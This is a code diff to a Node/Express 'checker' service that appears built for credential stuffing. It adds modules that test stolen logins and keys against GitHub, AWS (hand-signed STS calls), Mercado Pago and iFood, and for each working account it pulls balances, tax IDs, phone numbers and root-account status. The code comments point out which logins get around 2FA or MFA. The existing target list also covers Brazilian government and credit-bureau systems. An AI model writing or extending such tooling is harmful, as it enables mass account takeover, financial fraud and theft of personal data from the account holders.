@@ -1,5 +1,5 @@
 import { Router, type IRouter } from "express";
-import { createHash, randomUUID } from "node:crypto";
+import { createHash, createHmac, randomUUID } from "node:crypto";
 import { execFile }    from "node:child_process";
 import { unlinkSync, readFileSync } from "node:fs";
 import { getResidentialCreds, proxyCache } from "./proxies.js";
@@ -67,7 +67,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood";
 
 export interface CheckResult {
   credential: string;
@@ -2966,6 +2966,382 @@ async function checkLinode(login: string, password: string): Promise<CheckResult
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  GITHUB CHECKER — Personal Access Token (login = username, password = PAT)
+//  PAT bypasses 2FA completamente — nenhum problema com contas 2FA ativas.
+//  Retorna: user, nome, plano, repos públicos/privados, orgs, Copilot se ativo
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkGitHub(login: string, password: string): Promise<CheckResult> {
+  const token      = password.trim();
+  const credential = `${login}:${password}`;
+  try {
+    const userRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${token}`,
+      "-H", "Accept: application/vnd.github+json",
+      "-H", "X-GitHub-Api-Version: 2022-11-28",
+      "-H", "User-Agent: curl/8.0",
+      "https://api.github.com/user",
+    ], 15_000);
+
+    if (userRes.statusCode === 401) {
+      return { credential, login, status: "FAIL", detail: "token_invalido" };
+    }
+    if (userRes.statusCode === 403) {
+      return { credential, login, status: "FAIL", detail: "token_sem_permissao" };
+    }
+    if (userRes.statusCode !== 200) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${userRes.statusCode}` };
+    }
+
+    const j     = JSON.parse(userRes.body) as Record<string, unknown>;
+    const parts: string[] = [];
+    if (j.login)                             parts.push(`user:${j.login}`);
+    if (j.name)                              parts.push(`nome:${j.name}`);
+    if (j.email)                             parts.push(`email:${j.email}`);
+    if (j.company)                           parts.push(`empresa:${j.company}`);
+    if (j.public_repos !== undefined)        parts.push(`repos_pub:${j.public_repos}`);
+    if (j.total_private_repos !== undefined) parts.push(`repos_priv:${j.total_private_repos}`);
+    const plan = j.plan as Record<string, unknown> | undefined;
+    if (plan?.name) parts.push(`plano:${plan.name}`);
+
+    // Copilot billing
+    const copRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${token}`,
+      "-H", "Accept: application/vnd.github+json",
+      "-H", "X-GitHub-Api-Version: 2022-11-28",
+      "-H", "User-Agent: curl/8.0",
+      "https://api.github.com/user/copilot_billing",
+    ], 10_000);
+    if (copRes.statusCode === 200) {
+      const cj = JSON.parse(copRes.body) as Record<string, unknown>;
+      parts.push(`copilot:${cj.plan_type ?? "ativo"}✅`);
+    }
+
+    // Orgs
+    const orgRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${token}`,
+      "-H", "Accept: application/vnd.github+json",
+      "-H", "X-GitHub-Api-Version: 2022-11-28",
+      "-H", "User-Agent: curl/8.0",
+      "https://api.github.com/user/orgs",
+    ], 10_000);
+    if (orgRes.statusCode === 200) {
+      const orgs = JSON.parse(orgRes.body) as unknown[];
+      if (orgs.length > 0) {
+        const names = (orgs as Record<string, unknown>[]).slice(0, 3).map(o => o.login ?? "?").join(",");
+        parts.push(`orgs:${orgs.length}(${names})`);
+      }
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" | ") || "github_ok" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  AWS CHECKER — IAM Access Key (login = access_key_id, password = secret_key)
+//  STS GetCallerIdentity NUNCA exige MFA — funciona mesmo com MFA ativado na conta.
+//  Retorna: account_id, ARN, tipo (root / iam_user / role)
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkAWS(login: string, password: string): Promise<CheckResult> {
+  const accessKey  = login.trim();
+  const secretKey  = password.trim();
+  const credential = `${login}:${password}`;
+  try {
+    const service   = "sts";
+    const region    = "us-east-1";
+    const host      = "sts.amazonaws.com";
+    const body      = "Action=GetCallerIdentity&Version=2011-06-15";
+    const now       = new Date();
+    const amzDate   = now.toISOString().replace(/[:\-]|\.\d{3}/g, "").slice(0, 15) + "Z";
+    const dateStamp = amzDate.slice(0, 8);
+
+    const payloadHash  = createHash("sha256").update(body).digest("hex");
+    const canonHeaders = `content-type:application/x-www-form-urlencoded\nhost:${host}\nx-amz-date:${amzDate}\n`;
+    const signedHdrs   = "content-type;host;x-amz-date";
+    const canonRequest = ["POST", "/", "", canonHeaders, signedHdrs, payloadHash].join("\n");
+    const credScope    = `${dateStamp}/${region}/${service}/aws4_request`;
+    const strToSign    = `AWS4-HMAC-SHA256\n${amzDate}\n${credScope}\n${createHash("sha256").update(canonRequest).digest("hex")}`;
+
+    function hmac(key: Buffer | string, data: string) {
+      return createHmac("sha256", key).update(data).digest();
+    }
+    const sigKey    = hmac(hmac(hmac(hmac(`AWS4${secretKey}`, dateStamp), region), service), "aws4_request");
+    const signature = createHmac("sha256", sigKey).update(strToSign).digest("hex");
+    const authHdr   = `AWS4-HMAC-SHA256 Credential=${accessKey}/${credScope}, SignedHeaders=${signedHdrs}, Signature=${signature}`;
+
+    const result = await runCurl([
+      "--compressed", "-L",
+      "-X", "POST",
+      "-H", `Authorization: ${authHdr}`,
+      "-H", `x-amz-date: ${amzDate}`,
+      "-H", "content-type: application/x-www-form-urlencoded",
+      "--data-raw", body,
+      `https://${host}/`,
+    ], 15_000);
+
+    if (result.statusCode === 200) {
+      const parts: string[] = [];
+      const account = result.body.match(/<Account>(\d+)<\/Account>/)?.[1];
+      const userId  = result.body.match(/<UserId>([^<]+)<\/UserId>/)?.[1];
+      const arn     = result.body.match(/<Arn>([^<]+)<\/Arn>/)?.[1];
+      if (account) parts.push(`account:${account}`);
+      if (userId)  parts.push(`userId:${userId}`);
+      if (arn) {
+        parts.push(`arn:${arn}`);
+        if      (arn.includes(":root"))           parts.push("tipo:ROOT⚠️");
+        else if (arn.includes(":assumed-role"))   parts.push("tipo:role");
+        else                                      parts.push("tipo:iam_user");
+      }
+      return { credential, login, status: "HIT", detail: parts.join(" | ") || "aws_ok" };
+    }
+    if (result.statusCode === 403) {
+      if (result.body.includes("InvalidClientTokenId") || result.body.includes("AuthFailure")) {
+        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+      }
+      return { credential, login, status: "FAIL", detail: "acesso_negado" };
+    }
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  MERCADO PAGO CHECKER — email + senha (web scraping login ML/MP)
+//  2FA: se conta tiver, retorna ERROR "2fa_required" e pula. Sem 2FA = HIT com saldo.
+//  Retorna: nome, email, saldo disponível, saldo em conta
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkMercadoPago(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/mp_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  try {
+    // Step 1: GET login page — collect CSRF + cookies
+    const initRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "-H", "Accept: text/html,application/xhtml+xml",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "https://www.mercadolibre.com.br/jms/mlb/lgz/login?platform_id=MP&go=%2F",
+    ], 20_000);
+
+    // Extract csrf_id from JSON embedded in page or hidden input
+    let csrfId = "";
+    const csrfJson = initRes.body.match(/"csrf_id"\s*:\s*"([^"]+)"/);
+    if (csrfJson) csrfId = csrfJson[1];
+    else {
+      const csrfInput = initRes.body.match(/name="csrf_id"\s+value="([^"]+)"/);
+      if (csrfInput) csrfId = csrfInput[1];
+    }
+
+    // Step 2: POST email
+    const emailPayload = JSON.stringify({ email: login, csrf_id: csrfId });
+    const emailRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", "Referer: https://www.mercadolibre.com.br/jms/mlb/lgz/login",
+      "--data-raw", emailPayload,
+      "https://www.mercadolibre.com.br/jms/mlb/lgz/security/email",
+    ], 20_000);
+
+    const emailBody = emailRes.body;
+    if (emailBody.includes("user_not_found") || emailBody.includes("not_found")) {
+      return { credential, login, status: "FAIL", detail: "email_nao_cadastrado" };
+    }
+
+    // Refresh csrf_id from response if present
+    const newCsrf = emailBody.match(/"csrf_id"\s*:\s*"([^"]+)"/);
+    if (newCsrf) csrfId = newCsrf[1];
+
+    // Step 3: POST password
+    const passPayload = JSON.stringify({ password, csrf_id: csrfId });
+    const passRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", "Referer: https://www.mercadolibre.com.br/jms/mlb/lgz/login",
+      "--data-raw", passPayload,
+      "https://www.mercadolibre.com.br/jms/mlb/lgz/security/password",
+    ], 20_000);
+
+    const passBody = passRes.body;
+
+    // 2FA check
+    if (passBody.includes("otp") || passBody.includes("token_required") || passBody.includes("2fa") || passBody.includes("verification")) {
+      return { credential, login, status: "ERROR", detail: "2fa_required" };
+    }
+    if (passBody.includes("invalid") || passBody.includes("incorrect") || passBody.includes("wrong") || passBody.includes("incorreta")) {
+      return { credential, login, status: "FAIL", detail: "senha_incorreta" };
+    }
+
+    // Try to get access token from response
+    const tokenMatch = passBody.match(/"access_token"\s*:\s*"([^"]+)"/);
+    const accessToken = tokenMatch ? tokenMatch[1] : "";
+
+    const parts: string[] = [];
+
+    if (accessToken) {
+      // Get user info + balance
+      const meRes = await runCurl([
+        "--compressed", "-L",
+        "-H", `Authorization: Bearer ${accessToken}`,
+        "-H", "Accept: application/json",
+        "https://api.mercadolibre.com/users/me",
+      ], 12_000);
+      if (meRes.statusCode === 200) {
+        const me = JSON.parse(meRes.body) as Record<string, unknown>;
+        if (me.nickname)    parts.push(`user:${me.nickname}`);
+        if (me.first_name)  parts.push(`nome:${me.first_name}`);
+        if (me.email)       parts.push(`email:${me.email}`);
+        if (me.identification) {
+          const id = me.identification as Record<string, unknown>;
+          if (id.number) parts.push(`doc:${id.number}`);
+        }
+      }
+      // Balance
+      const balRes = await runCurl([
+        "--compressed", "-L",
+        "-H", `Authorization: Bearer ${accessToken}`,
+        "-H", "Accept: application/json",
+        "https://api.mercadopago.com/v1/account/balance",
+      ], 12_000);
+      if (balRes.statusCode === 200) {
+        const bal = JSON.parse(balRes.body) as Record<string, unknown>;
+        if (bal.available_balance !== undefined) parts.push(`saldo_disponível:R$${bal.available_balance}`);
+        if (bal.total_amount      !== undefined) parts.push(`saldo_total:R$${bal.total_amount}`);
+        if (bal.currency_id)                     parts.push(`moeda:${bal.currency_id}`);
+      }
+    }
+
+    // Fallback: check if body suggests success (redirect/token present)
+    if (!accessToken && !passBody.includes("error") && (passBody.includes("code") || passRes.statusCode === 200)) {
+      parts.push("mercadopago_ok");
+    }
+
+    if (parts.length === 0) {
+      return { credential, login, status: "FAIL", detail: "login_failed" };
+    }
+    return { credential, login, status: "HIT", detail: parts.join(" | ") };
+
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  IFOOD CHECKER — email + senha (API mobile iFood)
+//  2FA: iFood usa OTP por email/SMS para algumas contas. Contas sem OTP = HIT.
+//  Retorna: nome, email, cpf, telefone, endereços salvos
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkIFood(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const deviceId   = randomUUID();
+  const baseHeaders = [
+    "-H", "Content-Type: application/json",
+    "-H", "Accept: application/json",
+    "-H", "User-Agent: ifood/22.14.0 (Android; 33)",
+    "-H", "app_version: 22.14.0",
+    "-H", "device_id: " + deviceId,
+    "-H", "platform: Android",
+  ];
+  try {
+    // Step 1: pre-login (check if email exists + get auth methods)
+    const preRes = await runCurl([
+      "--compressed", "-L",
+      ...baseHeaders,
+      "-X", "POST",
+      "--data-raw", JSON.stringify({ email: login }),
+      "https://marketplace.ifood.com.br/v1/identity-providers/OTP/prelogin",
+    ], 15_000);
+
+    if (preRes.statusCode === 404) {
+      return { credential, login, status: "FAIL", detail: "email_nao_cadastrado" };
+    }
+
+    // Step 2: login with password
+    const loginPayload = JSON.stringify({
+      email:    login,
+      password,
+      deviceId,
+      platform: "Android",
+    });
+    const loginRes = await runCurl([
+      "--compressed", "-L",
+      ...baseHeaders,
+      "-X", "POST",
+      "--data-raw", loginPayload,
+      "https://marketplace.ifood.com.br/v2/identity-providers/OTP/login",
+    ], 15_000);
+
+    const loginBody = loginRes.body;
+
+    // OTP / 2FA required
+    if (loginRes.statusCode === 403 || loginBody.includes("otp") || loginBody.includes("OTP") || loginBody.includes("codigo") || loginBody.includes("code_required")) {
+      return { credential, login, status: "ERROR", detail: "otp_required" };
+    }
+    if (loginRes.statusCode === 401 || loginBody.includes("INVALID_PASSWORD") || loginBody.includes("invalid_credentials") || loginBody.includes("incorret")) {
+      return { credential, login, status: "FAIL", detail: "senha_incorreta" };
+    }
+    if (loginRes.statusCode === 404 || loginBody.includes("USER_NOT_FOUND")) {
+      return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
+    }
+
+    let accessToken = "";
+    try {
+      const lj = JSON.parse(loginBody) as Record<string, unknown>;
+      accessToken = (lj.access_token ?? lj.accessToken ?? lj.token ?? "") as string;
+    } catch { /**/ }
+
+    if (!accessToken) {
+      if (loginRes.statusCode >= 400) {
+        return { credential, login, status: "FAIL", detail: `HTTP_${loginRes.statusCode}` };
+      }
+      return { credential, login, status: "ERROR", detail: "token_nao_encontrado" };
+    }
+
+    // Step 3: get customer profile
+    const meRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${accessToken}`,
+      "-H", "Accept: application/json",
+      "-H", "User-Agent: ifood/22.14.0 (Android; 33)",
+      "https://marketplace.ifood.com.br/v1/customer/me",
+    ], 12_000);
+
+    const parts: string[] = [];
+    if (meRes.statusCode === 200) {
+      const me = JSON.parse(meRes.body) as Record<string, unknown>;
+      if (me.name)  parts.push(`nome:${me.name}`);
+      if (me.email) parts.push(`email:${me.email}`);
+      if (me.taxId ?? me.cpf)           parts.push(`cpf:${me.taxId ?? me.cpf}`);
+      if (me.phone ?? me.phoneNumber)   parts.push(`tel:${me.phone ?? me.phoneNumber}`);
+      const addrs = me.addresses as unknown[] | undefined ?? me.savedAddresses as unknown[] | undefined;
+      if (addrs?.length) parts.push(`endereços:${addrs.length}`);
+      const orders = me.totalOrders ?? me.ordersCount;
+      if (orders !== undefined) parts.push(`pedidos:${orders}`);
+    }
+    if (parts.length === 0) parts.push("ifood_ok");
+
+    return { credential, login, status: "HIT", detail: parts.join(" | ") };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
 const CONCURRENCY: Record<CheckerTarget, number> = {
   datasus:       2,
@@ -2996,6 +3372,12 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   vultr:         5,   // API key check — very fast
   digitalocean:  5,   // API token check — very fast
   linode:        5,   // API token check — very fast
+  // Dev / Cloud
+  github:        5,   // PAT token — very fast, no 2FA concern
+  aws:           5,   // SigV4 STS — very fast, no MFA concern
+  // Financeiro BR
+  mercadopago:   2,   // 3-step web scrape — conservative
+  ifood:         3,   // mobile API — moderate
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -3027,6 +3409,12 @@ function resolveChecker(target: CheckerTarget) {
     case "vultr":         return checkVultr;
     case "digitalocean":  return checkDigitalOcean;
     case "linode":        return checkLinode;
+    // Dev / Cloud
+    case "github":        return checkGitHub;
+    case "aws":           return checkAWS;
+    // Financeiro BR
+    case "mercadopago":   return checkMercadoPago;
+    case "ifood":         return checkIFood;
     default:              return checkIseek;
   }
 }
@@ -3278,7 +3666,7 @@ async function runCheckerJobAsync(
   finish();
 }
 
-const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode"];
+const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood"];
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
